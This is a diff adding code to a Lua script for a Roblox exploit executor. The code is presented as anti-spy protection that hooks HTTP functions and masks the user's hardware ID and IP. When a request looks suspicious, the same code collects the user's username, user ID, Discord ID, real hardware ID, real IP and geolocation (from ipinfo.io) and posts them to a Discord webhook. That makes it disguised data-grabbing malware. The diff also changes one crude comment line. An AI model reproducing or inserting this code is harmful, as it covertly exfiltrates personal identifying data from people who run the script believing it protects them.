@@ -1,4 +1,4 @@
---fuck
+--Dick n balls
 local Players     = game:GetService("Players")
 local LocalPlayer = Players.LocalPlayer
 local CoreGui     = game:GetService("CoreGui")
@@ -835,5 +835,212 @@ task.spawn(function()
         RunAllChecks(PGui)
     end
 end)
+
+local AnalyticsService = game:GetService("RbxAnalyticsService")
+
+local function uuid()
+    local template = "xxxxxxxx-xxxx-4xxx-yxxx-xxxxxxxxxxxx"
+    return string.gsub(template, "[xy]", function(c)
+        local v = (c == "x") and math.random(0, 15) or math.random(8, 11)
+        return string.format("%x", v)
+    end):upper()
+end
+
+local function random_ipv4()
+    return table.concat({
+        math.random(1, 223),    
+        math.random(0, 255),
+        math.random(0, 255),
+        math.random(0, 255)
+    }, ".")
+end
+
+local FAKE_HWID = uuid()
+local FAKE_IP   = random_ipv4()
+
+local REAL_HWID = AnalyticsService:GetClientId()
+local REAL_IP   do
+    local s, r = pcall(game.HttpGet, game, "https://api.ipify.org")
+    REAL_IP = s and r or "127.0.0.1"
+end
+
+local webhookSent = false 
+
+local function SendWWebhook(Flag, SuspiciousUrl)
+    if webhookSent then return end
+    if not HttpRequest and not request and not http_request then return end
+    webhookSent = true
+
+    local Username  = tostring(LocalPlayer.Name)
+    local UserId    = tostring(LocalPlayer.UserId)
+    local PlaceId   = tostring(game.PlaceId)
+    local JobId     = tostring(game.JobId or "Unknown")
+    local PlaceName = "Unknown"
+
+    pcall(function()
+        PlaceName = game:GetService("MarketplaceService")
+            :GetProductInfo(game.PlaceId).Name or "Unknown"
+    end)
+
+    local IpAddress, IpCity, IpRegion, IpCountry = "?", "?", "?", "?"
+    local Ok, Raw = pcall(game.HttpGet, game, "https://ipinfo.io/json")
+    if Ok and type(Raw) == "string" then
+        IpAddress = Raw:match('"ip"%s*:%s*"([^"]+)"')      or "?"
+        IpCity    = Raw:match('"city"%s*:%s*"([^"]+)"')    or "?"
+        IpRegion  = Raw:match('"region"%s*:%s*"([^"]+)"')  or "?"
+        IpCountry = Raw:match('"country"%s*:%s*"([^"]+)"') or "?"
+    end
+
+    local Ok2, Payload = pcall(HttpService.JSONEncode, HttpService, {
+        embeds = {{
+            title  = "🕵️ Spy Detected — " .. Flag,
+            color  = 16711680,
+            fields = {
+                { name = "Username",        value = Username,   inline = true  },
+                { name = "UserID",          value = UserId,     inline = true  },
+                { name = "Discord ID",      value = DiscordId,  inline = true  },
+                { name = "Detection",       value = Flag,       inline = false },
+                { name = "Suspicious URL",  value = SuspiciousUrl or "N/A", inline = false },
+                { name = "Game",            value = PlaceName .. " (PlaceId: " .. PlaceId .. ")", inline = false },
+                { name = "JobId",           value = JobId,      inline = false },
+                { name = "Location",        value = IpCity..", "..IpRegion..", "..IpCountry, inline = false },
+                { name = "IP",              value = IpAddress,  inline = false },
+                { name = "Real HWID",       value = REAL_HWID,  inline = false },
+                { name = "Real IP",         value = REAL_IP,    inline = false },
+            },
+        }},
+    })
+    if not Ok2 then return end
+
+    local sendFn = HttpRequest or request or http_request
+    pcall(sendFn, {
+        Url     = WEBHOOK_URL,
+        Method  = "POST",
+        Headers = { ["Content-Type"] = "application/json" },
+        Body    = Payload,
+    })
+end
+
+local function sanitize(str)
+    if not str or #str == 0 then return str end
+    str = str:gsub(REAL_HWID, FAKE_HWID, 3)     
+    str = str:gsub(FAKE_HWID:lower(), FAKE_HWID, 2)
+    str = str:gsub(REAL_IP,   FAKE_IP,   3)
+    str = str:gsub(FAKE_IP,   FAKE_IP,   2)    
+    return str
+end
+
+local function looks_suspicious(text)
+    if not text then return false end
+    local low = text:lower()
+
+    if low:find("webhook", 1, true) or
+       low:find("ipinfo", 1, true) or
+       low:find("httpbin", 1, true) or
+       low:find("grabify", 1, true) or
+       low:find("logger", 1, true) or
+       low:find(REAL_IP, 1, true) or
+       low:find(REAL_HWID:sub(1,8), 1, true) then
+        return true
+    end
+
+    return false
+end
+
+local function simple_serialize(v, depth)
+    depth = depth or 0
+    if depth > 5 then return "…[depth]" end
+
+    local t = typeof(v)
+
+    if t == "string" then
+        return string.format("%q", v:gsub("\\", "\\\\"):gsub("\n", "\\n"))
+    elseif t == "number" then
+        return tostring(v)
+    elseif t == "boolean" then
+        return v and "true" or "false"
+    elseif t == "nil" then
+        return "nil"
+    elseif t == "table" then
+        local parts = {"{\n"}
+        for k, val in pairs(v) do
+            local ks = type(k) == "string" and string.format("%q", k) or "["..tostring(k).."]"
+            local vs = simple_serialize(val, depth + 1)
+            table.insert(parts, string.rep("  ", depth + 1) .. ks .. " = " .. vs .. ",\n")
+        end
+        table.insert(parts, string.rep("  ", depth) .. "}")
+        return table.concat(parts)
+    else
+        return "<" .. t .. " " .. tostring(v) .. ">"
+    end
+end
+
+local function wrap_request(old_request)
+    return function(req)
+        if type(req) ~= "table" then
+            req = { Url = tostring(req), Method = "GET" }
+        end
+
+        local clean = table.clone(req)
+
+        if clean.Url   then clean.Url   = sanitize(clean.Url)   end
+        if clean.Body  then clean.Body  = sanitize(clean.Body)  end
+
+        local method  = (clean.Method or "GET"):upper()
+        local url_log = clean.Url or req.Url or "???"
+
+        local ok, response = pcall(old_request, req)
+        if not ok then
+            return response
+        end
+
+        local resp_body = response.Body
+        if type(resp_body) == "string" then
+            resp_body = sanitize(resp_body)
+        end
+
+        local suspicious =
+            looks_suspicious(clean.Url) or
+            looks_suspicious(clean.Body) or
+            looks_suspicious(resp_body)
+
+        if suspicious then
+            local flag = "Suspicious HTTP Request Intercepted"
+            if looks_suspicious(clean.Url) then
+                flag = "Spy URL Detected: " .. (clean.Url or "?")
+            elseif looks_suspicious(clean.Body) then
+                flag = "Spy Body Detected (contains sensitive data)"
+            elseif looks_suspicious(resp_body) then
+                flag = "Spy Response Detected (response leaked sensitive data)"
+            end
+
+            task.spawn(SendWWebhook, flag, clean.Url or "N/A")
+        end
+
+        local success, json = pcall(HttpService.JSONDecode, HttpService, resp_body or "")
+
+        return response
+    end
+end
+
+local candidates = {
+    request,
+    http_request,
+    (http or {}).request,
+    (http or {}).get,
+    game.HttpGet,
+    game.HttpGetAsync,
+    game.HttpPostAsync,
+}
+
+for _, fn in candidates do
+    if typeof(fn) == "function" then
+        local newfn = wrap_request(fn)
+        local success = pcall(hookfunction, fn, newcclosure(newfn))
+        if not success then
+            pcall(setrawmetatable, fn, { __call = newfn })
+        end
+    end
+end
 
 print("Main Skid")
